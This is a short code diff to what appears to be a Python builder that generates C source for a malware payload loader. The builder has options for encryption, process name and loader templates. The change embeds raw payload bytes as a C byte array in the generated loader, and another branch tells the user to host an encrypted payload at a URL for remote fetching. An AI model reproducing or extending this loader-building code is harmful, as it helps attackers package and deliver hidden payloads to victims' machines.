@@ -33,8 +33,9 @@ def build (Path, Encryption, Enumeration, Payload, ProcessName, Loader, Url):
 #include "../Spells/{Loader}"
 """)
     if Payload != "null":
+        Payload_Str = "static const unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), Payload)) + "};"
         f.write(f"""\n
-{Payload} 
+{Payload_Str} 
 """)
         
     f.write(f"""\n
@@ -177,9 +178,9 @@ def main():
             Payload = "null"
             print("\n[!!]NOTE[!!]\nEncrypted Payload is saved as encrypted.bin")
             print(f"Please host the encrypted.bin at {Url}")
-    else:
-        pass
-    
+    # else:
+    #     Payload_Plain = "static const unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), Payload)) + "};"
+    #     Payload = Payload_Plain
     #TODO  set_payload_encryption()
 
     if set_loader_type() == "1":
